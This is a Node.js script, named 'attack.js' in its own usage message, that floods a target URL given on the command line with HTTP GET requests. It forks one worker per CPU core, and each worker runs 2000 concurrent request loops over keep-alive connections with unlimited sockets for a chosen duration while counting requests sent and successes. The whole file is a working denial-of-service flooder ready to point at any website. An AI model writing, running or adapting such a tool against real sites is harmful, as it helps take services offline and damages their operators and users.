const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const [, , target, durationSec] = process.argv;

if (!target || !durationSec) {
  console.log('Usage: node attack.js <target> <duration_seconds>');
  process.exit(1);
}

const duration = parseInt(durationSec) * 1000;
const warmup = 5000;
const endTime = Date.now() + duration + warmup;

if (cluster.isMaster) {
  const cpuCount = os.cpus().length;
  console.log(`Starting ${cpuCount} workers... (warmup ${warmup / 1000}s)`);

  for (let i = 0; i < cpuCount; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} exited`);
  });

  setTimeout(() => {
    console.log('\nTest done. Killing workers...');
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
  }, duration + warmup + 1000);

} else {
  const url = new URL(target);
  const isHttps = url.protocol === 'https:';

  const agent = isHttps
    ? new https.Agent({ keepAlive: true, maxSockets: Infinity })
    : new http.Agent({ keepAlive: true, maxSockets: Infinity });

  const client = isHttps ? https : http;

  let total = 0;
  let successes = 0;

  function requestLoop() {
    if (Date.now() > endTime) return;

    const req = client.get(target, { agent }, (res) => {
      res.on('data', () => {});
      res.on('end', () => {
        successes++;
        total++;
        requestLoop();
      });
    });

    req.on('error', () => {
      total++;
      requestLoop();
    });
  }

  // Start request loops after warmup
  const MAX_LOOPS = 2000;
  setTimeout(() => {
    for (let i = 0; i < MAX_LOOPS; i++) {
      requestLoop();
    }
  }, warmup);

  // Log every 5 seconds (overwrite style)
  const logInterval = setInterval(() => {
    process.stdout.write(`\rTOTAL SENT: ${total.toString().padEnd(12)} SUCCESSES: ${successes}`);
  }, 5000);

  // Final summary
  setTimeout(() => {
    clearInterval(logInterval);
    console.log(`\nWorker ${process.pid} done. SENT: ${total}, SUCCESSES: ${successes}`);
    process.exit();
  }, duration + warmup + 500);
}
